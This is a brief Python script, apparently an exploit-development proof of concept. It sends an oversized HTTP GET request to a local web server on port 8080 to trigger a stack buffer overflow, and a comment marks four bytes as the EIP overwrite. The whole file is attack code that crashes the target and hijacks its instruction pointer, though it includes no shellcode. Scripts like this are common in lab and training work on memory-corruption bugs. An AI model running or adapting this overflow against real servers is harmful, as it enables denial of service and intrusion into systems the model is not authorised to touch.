import socket
import os
import sys
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#over write eip B's
stuff = "A"*515 + "B"*4 + "X"*80

buffer =  "GET /" + stuff + " HTTP/1.1\r\n"
buffer += "Host: 172.16.0.24:8080\r\n"
buffer += "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:79.0) Gecko/20100101 Firefox/79.0\r\n"
buffer += "Keep-Alive: 115\r\n"
buffer += "Connection: keep-alive\r\n\r\n"
 
s.connect(("127.0.0.1", 8080))
s.send(buffer)
s.close()
